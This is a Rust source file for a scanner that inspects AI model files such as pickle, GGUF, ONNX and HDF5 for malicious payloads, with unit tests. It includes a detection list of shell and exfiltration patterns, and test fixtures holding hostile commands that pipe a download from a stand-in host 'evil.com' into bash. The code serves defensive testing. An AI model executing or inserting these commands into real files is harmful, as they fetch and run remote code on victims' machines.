use agentguard_core::GuardResult;
use std::path::Path;

#[derive(Debug, Clone, Copy, PartialEq, Eq, serde::Serialize, serde::Deserialize)]
pub enum ModelFormat {
    Pickle,
    SafeTensors,
    Gguf,
    Onnx,
    Hdf5,
    Checkpoint,
    TensorFlowSavedModel,
    Unknown,
}

#[derive(Debug, Clone, PartialEq, Eq, serde::Serialize, serde::Deserialize)]
pub enum ThreatLevel {
    Clean,
    Suspicious,
    Malicious,
}

#[derive(Debug, Clone, serde::Serialize, serde::Deserialize)]
pub struct ScanResult {
    pub path: std::path::PathBuf,
    pub format: ModelFormat,
    pub threat_level: ThreatLevel,
    pub findings: Vec<String>,
}

impl ModelFormat {
    pub fn from_path(path: &Path) -> Self {
        if let Some(ext) = path.extension().and_then(|e| e.to_str()) {
            match ext.to_lowercase().as_str() {
                "pt" | "pth" | "pkl" | "pickle" | "ckpt" => {
                    if ext.eq_ignore_ascii_case("ckpt") {
                        return ModelFormat::Checkpoint;
                    }
                    ModelFormat::Pickle
                }
                "safetensors" => ModelFormat::SafeTensors,
                "gguf" => ModelFormat::Gguf,
                "onnx" => ModelFormat::Onnx,
                "h5" | "hdf5" | "keras" => ModelFormat::Hdf5,
                _ => ModelFormat::Unknown,
            }
        } else if path.file_name().and_then(|n| n.to_str()) == Some("saved_model.pb") {
            ModelFormat::TensorFlowSavedModel
        } else {
            ModelFormat::Unknown
        }
    }

    pub fn is_ai_model(path: &Path) -> bool {
        !matches!(Self::from_path(path), ModelFormat::Unknown)
    }

    pub fn as_str(&self) -> &'static str {
        match self {
            ModelFormat::Pickle => "pickle",
            ModelFormat::SafeTensors => "safetensors",
            ModelFormat::Gguf => "gguf",
            ModelFormat::Onnx => "onnx",
            ModelFormat::Hdf5 => "hdf5",
            ModelFormat::Checkpoint => "checkpoint",
            ModelFormat::TensorFlowSavedModel => "tensorflow_saved_model",
            ModelFormat::Unknown => "unknown",
        }
    }

    pub fn risk_description(&self) -> &'static str {
        match self {
            ModelFormat::Pickle => "HIGH: Pickle can execute arbitrary Python code during deserialization. Malicious models can contain backdoors, reverse shells, or ransomware.",
            ModelFormat::Checkpoint => "HIGH: PyTorch checkpoints use pickle serialization by default.",
            ModelFormat::Gguf => "MEDIUM: GGUF is a safer format but should be verified for integrity.",
            ModelFormat::Onnx => "MEDIUM: ONNX models can contain custom operators that execute code.",
            ModelFormat::Hdf5 => "MEDIUM: HDF5 can contain complex data structures; Keras models use Lambda layers that can execute arbitrary code.",
            ModelFormat::TensorFlowSavedModel => "HIGH: SavedModel can contain arbitrary Python functions via tf.function.",
            ModelFormat::SafeTensors => "LOW: SafeTensors is a safe tensor format but header should still be validated.",
            ModelFormat::Unknown => "UNKNOWN",
        }
    }
}

impl std::fmt::Display for ModelFormat {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        write!(f, "{}", self.as_str())
    }
}

pub fn scan_file(path: &Path) -> GuardResult<ScanResult> {
    let format = ModelFormat::from_path(path);
    let mut findings = Vec::new();
    let mut threat_level = ThreatLevel::Clean;

    if matches!(format, ModelFormat::Unknown) {
        return Ok(ScanResult {
            path: path.to_path_buf(),
            format,
            threat_level: ThreatLevel::Clean,
            findings: vec!["Not an AI model file".into()],
        });
    }

    findings.push(format!("Detected {} model file", format.as_str()));

    if !path.is_file() {
        return Ok(ScanResult {
            path: path.to_path_buf(),
            format,
            threat_level,
            findings,
        });
    }

    let data = match read_file_head(path, 65536) {
        Ok(d) => d,
        Err(e) => {
            findings.push(format!("Cannot read file: {e}"));
            return Ok(ScanResult { path: path.to_path_buf(), format, threat_level: ThreatLevel::Suspicious, findings });
        }
    };

    let size_mb = file_size_mb(path);
    findings.push(format!("Size: {:.1} MB", size_mb));

    match format {
        ModelFormat::Pickle | ModelFormat::Checkpoint => {
            scan_pickle(&data, path, &mut findings, &mut threat_level);
        }
        ModelFormat::SafeTensors => {
            scan_safetensors(&data, &mut findings, &mut threat_level);
        }
        ModelFormat::Gguf => {
            scan_gguf(&data, &mut findings, &mut threat_level);
        }
        ModelFormat::Onnx => {
            scan_onnx(&data, &mut findings, &mut threat_level);
        }
        ModelFormat::Hdf5 => {
            scan_hdf5(&data, &mut findings, &mut threat_level);
        }
        ModelFormat::TensorFlowSavedModel => {
            scan_tf_saved_model(path, &mut findings, &mut threat_level);
        }
        ModelFormat::Unknown => {}
    }

    if threat_level == ThreatLevel::Malicious {
        findings.push("BLOCK: This model file should be denied by Phylax".into());
    }

    Ok(ScanResult {
        path: path.to_path_buf(),
        format,
        threat_level,
        findings,
    })
}

fn scan_pickle(data: &[u8], _path: &Path, findings: &mut Vec<String>, threat_level: &mut ThreatLevel) {
    let header = data.first().copied().unwrap_or(0);
    let protocol = if data.len() > 1 { data[1] } else { 0 };
    findings.push(format!("Pickle protocol: {} (header: 0x{:02x})", protocol, header));

    if header == 0x80 {
        findings.push("Pickle protocol 2+ detected".into());
    }

    let data_str = String::from_utf8_lossy(data);
    let suspicious_patterns = [
        ("__import__", "Uses __import__() — can load arbitrary modules"),
        ("os.system", "Calls os.system() — arbitrary command execution"),
        ("subprocess", "Uses subprocess — arbitrary command execution"),
        ("eval(", "Calls eval() — arbitrary code execution"),
        ("exec(", "Calls exec() — arbitrary code execution"),
        ("compile(", "Calls compile() — can execute arbitrary code"),
        ("socket", "Uses socket — network communication"),
        ("requests", "Uses requests — network exfiltration"),
        ("http", "Uses http — network access"),
        ("base64", "Uses base64 — possible obfuscation"),
        ("marshal", "Uses marshal — Python serialization"),
        ("ctypes", "Uses ctypes — native code execution"),
        ("open(", "Calls open() — file system access"),
        ("write(", "File write operation"),
        ("chmod", "File permission changes"),
        ("reverse_shell", "Reverse shell pattern"),
        (".exe", "Windows executable reference"),
        ("powershell", "PowerShell command reference"),
        ("cmd.exe", "Command prompt reference"),
        ("/bin/bash", "Shell execution"),
        ("/bin/sh", "Shell execution"),
        ("wget", "Download utility"),
        ("curl", "Download utility"),
    ];

    let mut found_dangerous = false;
    for (pattern, desc) in &suspicious_patterns {
        if data_str.to_lowercase().contains(&pattern.to_lowercase()) {
            findings.push(format!("SUSPICIOUS: {} — {}", pattern, desc));
            found_dangerous = true;
        }
    }

    if found_dangerous {
        *threat_level = ThreatLevel::Malicious;
        findings.push("HIGH RISK: Pickle file contains potentially executable patterns. This model should NOT be loaded.".into());
    }
}

fn scan_safetensors(data: &[u8], findings: &mut Vec<String>, threat_level: &mut ThreatLevel) {
    if data.len() < 8 {
        findings.push("INVALID: File too small for SafeTensors header".into());
        *threat_level = ThreatLevel::Suspicious;
        return;
    }

    let header_size = u64::from_le_bytes(data[..8].try_into().unwrap_or([0; 8]));
    let header_size_usize = usize::try_from(header_size).unwrap_or(usize::MAX);
    let header_end = 8usize.saturating_add(header_size_usize);
    findings.push(format!("Header size: {} bytes", header_size));

    if header_size > 100_000_000 {
        findings.push("SUSPICIOUS: Header size too large (>100MB)".into());
        *threat_level = ThreatLevel::Suspicious;
    } else if header_end <= data.len() {
        if let Ok(header_json) = std::str::from_utf8(&data[8..header_end]) {
            if serde_json::from_str::<serde_json::Value>(header_json).is_ok() {
                findings.push("SafeTensors header validated — JSON OK".into());
            } else {
                findings.push("INVALID: Header JSON parse failed".into());
                *threat_level = ThreatLevel::Suspicious;
            }
        }
    } else {
        findings.push("INVALID: Header extends beyond file".into());
        *threat_level = ThreatLevel::Suspicious;
    }
}

fn scan_gguf(data: &[u8], findings: &mut Vec<String>, threat_level: &mut ThreatLevel) {
    if data.len() < 8 {
        findings.push("INVALID: File too small for GGUF header".into());
        return;
    }

    let magic = &data[..4];
    let version = u32::from_le_bytes(data[4..8].try_into().unwrap_or([0; 4]));

    if magic == b"GGUF" {
        findings.push(format!("GGUF magic verified — version {}", version));
    } else {
        findings.push(format!("INVALID: Bad GGUF magic bytes: {:02x?}", magic));
        *threat_level = ThreatLevel::Suspicious;
    }
}

fn scan_onnx(data: &[u8], findings: &mut Vec<String>, threat_level: &mut ThreatLevel) {
    if data.len() < 4 {
        return;
    }

    let magic = &data[..4];
    if magic == b"\x08\x00\x00\x00" || magic == b"\x08\x00" {
        findings.push("ONNX protobuf format detected".into());
    } else {
        findings.push("Unknown ONNX variant".into());
    }

    let data_str = String::from_utf8_lossy(data);
    for pattern in &["CustomOp", "PyTorch", "tf.", "torch."] {
        if data_str.contains(pattern) {
            findings.push(format!("Custom operator reference: {}", pattern));
            if *threat_level != ThreatLevel::Malicious {
                *threat_level = ThreatLevel::Suspicious;
            }
        }
    }
}

fn scan_hdf5(data: &[u8], findings: &mut Vec<String>, threat_level: &mut ThreatLevel) {
    if data.len() < 8 {
        return;
    }

    let magic = &data[..8];
    let expected: [u8; 8] = [0x89, 0x48, 0x44, 0x46, 0x0D, 0x0A, 0x1A, 0x0A];

    if magic == expected {
        findings.push("HDF5 magic bytes verified".into());
    } else {
        findings.push("INVALID: Not a valid HDF5 file".into());
        *threat_level = ThreatLevel::Suspicious;
    }
}

fn scan_tf_saved_model(path: &Path, findings: &mut Vec<String>, threat_level: &mut ThreatLevel) {
    let parent = path.parent().unwrap_or(path);
    let variables = parent.join("variables");
    let assets = parent.join("assets");

    if variables.exists() {
        findings.push("SavedModel variables/ directory found".into());
    }
    if assets.exists() {
        findings.push("SavedModel assets/ directory found".into());
    }

    let data = match std::fs::read(path) {
        Ok(d) => d,
        Err(_) => return,
    };

    let content = String::from_utf8_lossy(&data);
    if content.contains("tf.function") || content.contains("def serve") {
        findings.push("Custom TensorFlow functions detected".into());
        *threat_level = ThreatLevel::Malicious;
    }
}

pub fn scan_directory(dir: &Path) -> GuardResult<Vec<ScanResult>> {
    let mut results = Vec::new();
    scan_dir_recursive(dir, &mut results)?;
    results.sort_by_key(|r| {
        let level = match r.threat_level {
            ThreatLevel::Malicious => 0,
            ThreatLevel::Suspicious => 1,
            ThreatLevel::Clean => 2,
        };
        (level, r.path.clone())
    });
    Ok(results)
}

fn read_file_head(path: &Path, max_bytes: usize) -> Result<Vec<u8>, std::io::Error> {
    use std::io::Read;
    let file = std::fs::File::open(path)?;
    let metadata = file.metadata()?;
    let read_size = max_bytes.min(metadata.len() as usize);
    let mut buf = vec![0u8; read_size];
    let mut reader = std::io::BufReader::new(file);
    reader.read_exact(&mut buf)?;
    Ok(buf)
}

fn file_size_mb(path: &Path) -> f64 {
    std::fs::metadata(path).map(|m| m.len() as f64 / (1024.0 * 1024.0)).unwrap_or(0.0)
}

fn scan_dir_recursive(dir: &Path, results: &mut Vec<ScanResult>) -> GuardResult<()> {
    if !dir.is_dir() {
        return Ok(());
    }
    for entry in std::fs::read_dir(dir).map_err(|e| agentguard_core::GuardError::IpcError(format!("read_dir: {e}")))? {
        let entry = entry.map_err(|e| agentguard_core::GuardError::IpcError(format!("dir entry: {e}")))?;
        let path = entry.path();
        if path.is_dir() {
            let name = path.file_name().and_then(|n| n.to_str()).unwrap_or("");
            if name == "node_modules" || name == "target" || name == ".git" || name == "__pycache__" {
                continue;
            }
            scan_dir_recursive(&path, results)?;
        } else if path.is_file() {
            if ModelFormat::is_ai_model(&path) {
                match scan_file(&path) {
                    Ok(r) => results.push(r),
                    Err(e) => eprintln!("[scanner] Error scanning {}: {e}", path.display()),
                }
            }
        }
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::io::Write;

    #[test]
    fn detect_pickle_pt() {
        let fmt = ModelFormat::from_path(Path::new("model.pt"));
        assert_eq!(fmt, ModelFormat::Pickle);
    }

    #[test]
    fn detect_safetensors() {
        let fmt = ModelFormat::from_path(Path::new("model.safetensors"));
        assert_eq!(fmt, ModelFormat::SafeTensors);
    }

    #[test]
    fn detect_gguf() {
        let fmt = ModelFormat::from_path(Path::new("llama.gguf"));
        assert_eq!(fmt, ModelFormat::Gguf);
    }

    #[test]
    fn detect_onnx() {
        let fmt = ModelFormat::from_path(Path::new("model.onnx"));
        assert_eq!(fmt, ModelFormat::Onnx);
    }

    #[test]
    fn detect_h5() {
        let fmt = ModelFormat::from_path(Path::new("model.h5"));
        assert_eq!(fmt, ModelFormat::Hdf5);
    }

    #[test]
    fn detect_checkpoint() {
        let fmt = ModelFormat::from_path(Path::new("checkpoint.ckpt"));
        assert_eq!(fmt, ModelFormat::Checkpoint);
    }

    #[test]
    fn is_ai_model_true() {
        assert!(ModelFormat::is_ai_model(Path::new("model.pt")));
    }

    #[test]
    fn is_ai_model_false() {
        assert!(!ModelFormat::is_ai_model(Path::new("document.pdf")));
    }

    #[test]
    fn scan_pickle_with_suspicious_patterns() {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("bad_model.pkl");
        let pickle_data = b"S'__import__(\"os\").system(\"curl http://evil.com | /bin/bash\")'\np0\n.";
        std::fs::write(&path, pickle_data).unwrap();

        let result = scan_file(&path).unwrap();
        assert_eq!(result.format, ModelFormat::Pickle);
        assert_eq!(result.threat_level, ThreatLevel::Malicious);
        assert!(result.findings.iter().any(|f| f.contains("SUSPICIOUS")));
    }

    #[test]
    fn scan_safetensors_header() {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("model.safetensors");
        let header = b"{\"test\": \"data\"}";
        let mut data = Vec::new();
        data.extend_from_slice(&(header.len() as u64).to_le_bytes());
        data.extend_from_slice(header);
        data.extend_from_slice(&[0u8; 64]);
        std::fs::write(&path, &data).unwrap();

        let result = scan_file(&path).unwrap();
        assert_eq!(result.format, ModelFormat::SafeTensors);
        assert!(result.findings.iter().any(|f| f.contains("validated")));
    }

    #[test]
    fn scan_gguf_invalid_magic() {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("bad.gguf");
        std::fs::write(&path, b"BADF\x00\x00\x00\x01").unwrap();

        let result = scan_file(&path).unwrap();
        assert!(result.findings.iter().any(|f| f.contains("Bad GGUF magic")));
    }

    #[test]
    fn clean_model_is_clean() {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("clean.gguf");
        let mut data = vec![b'G', b'G', b'U', b'F', 0x03, 0x00, 0x00, 0x00];
        data.extend_from_slice(&vec![0u8; 256]);
        std::fs::write(&path, &data).unwrap();

        let result = scan_file(&path).unwrap();
        assert_eq!(result.threat_level, ThreatLevel::Clean);
    }

    #[test]
    fn scan_pickle_with_import() {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("import_model.pt");
        let payload = b"S'__import__(\"subprocess\").call([\"curl\", \"http://evil.com\"])'\np0\n.";
        std::fs::write(&path, payload).unwrap();

        let result = scan_file(&path).unwrap();
        assert_eq!(result.threat_level, ThreatLevel::Malicious);
        assert!(result.findings.iter().any(|f| f.contains("__import__")));
        assert!(result.findings.iter().any(|f| f.contains("subprocess")));
        assert!(result.findings.iter().any(|f| f.contains("curl")));
    }

    #[test]
    fn scan_directory_finds_models() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(dir.path().join("model.pt"), b"\x80\x04\x95\x00\x00\x00\x00\x00\x00\x00.").unwrap();
        std::fs::write(dir.path().join("model.safetensors"), b"\x08\x00\x00\x00\x00\x00\x00\x00{}").unwrap();

        let results = scan_directory(dir.path()).unwrap();
        assert_eq!(results.len(), 2);
    }

    #[test]
    fn pickle_with_os_system_is_malicious() {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("evil.pkl");
        let payload = b"S'os.system(\"curl http://evil.com | bash\")'\np0\n.";
        std::fs::write(&path, payload).unwrap();

        let result = scan_file(&path).unwrap();
        assert_eq!(result.threat_level, ThreatLevel::Malicious);
    }

    #[test]
    fn pickle_with_eval_is_malicious() {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("eval_model.pth");
        let payload = b"S'eval(\"print(1)\")'\np0\n.";
        std::fs::write(&path, payload).unwrap();

        let result = scan_file(&path).unwrap();
        assert_eq!(result.threat_level, ThreatLevel::Malicious);
        assert!(result.findings.iter().any(|f| f.contains("eval(")));
    }

    #[test]
    fn unknown_format_is_clean() {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("readme.md");
        std::fs::write(&path, b"# Readme").unwrap();

        let result = scan_file(&path).unwrap();
        assert_eq!(result.format, ModelFormat::Unknown);
        assert_eq!(result.threat_level, ThreatLevel::Clean);
    }
}
